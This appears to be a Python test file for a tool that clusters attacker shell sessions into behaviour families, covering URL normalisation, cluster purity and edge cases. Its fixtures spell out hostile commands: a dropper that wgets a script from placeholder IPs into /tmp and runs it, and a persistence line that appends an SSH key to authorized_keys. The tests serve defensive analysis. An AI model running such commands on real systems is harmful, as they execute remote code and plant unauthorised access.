from collections import defaultdict
from analysis.cluster import cluster_sessions, normalize_word, session_tokens, report
from tools.simulate import RECON, HUMAN


def sess(i, cmds):
    return {"session_id": f"s{i}", "commands": [[k, c, "exec"] for k, c in enumerate(cmds)]}


def test_normalization_abstracts_urls_ips_numbers():
    assert normalize_word("http://1.2.3.4/a.sh") == "<URL>" and normalize_word("9.9.9.9") == "<URL>"
    assert normalize_word("evil.test/x") == "<URL>" and normalize_word("3333") == "<N>"
    assert normalize_word("/etc/passwd") == "/etc/passwd"
    assert session_tokens(sess(0, ["wget http://a.b/c; id"])) == ["wget", "<URL>", ";", "id", ";"]


def test_clusters_are_pure_wrt_behaviour_families():
    families = {"recon": RECON * 3, "human": [" ; ".join(HUMAN)] * 3,
                "drop": [f"cd /tmp; wget http://{i}.{i}.{i}.{i}/a.sh -O .x; chmod 777 .x; sh .x" for i in range(1, 5)],
                "persist": ['mkdir -p ~/.ssh; echo "ssh-rsa AAAA k" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys'] * 3}
    sessions, fam = [], {}
    for name, cmds in families.items():
        for c in cmds:
            s = sess(len(sessions), [c]); sessions.append(s); fam[s["session_id"]] = name
    kept, ids, _ = cluster_sessions(sessions)
    by = defaultdict(set)
    for s, i in zip(kept, ids):
        if i != -1:
            by[i].add(fam[s["session_id"]])
    assert by and all(len(v) == 1 for v in by.values())        # no cluster mixes families
    drop_ids = {i for s, i in zip(kept, ids) if fam[s["session_id"]] == "drop"}
    assert len(drop_ids) == 1 and -1 not in drop_ids            # URL abstraction merges all dropper variants


def test_degenerate_inputs():
    assert cluster_sessions([]) == ([], [], None)
    kept, ids, X = cluster_sessions([sess(0, ["id"])])
    assert ids == [-1] and X is None
    assert cluster_sessions([{"session_id": "x", "commands": []}] * 3)[0] == []
    report([], None, out=lambda *a: None); report([sess(0, ["id"])], None, out=lambda *a: None)   # no crash on tiny data
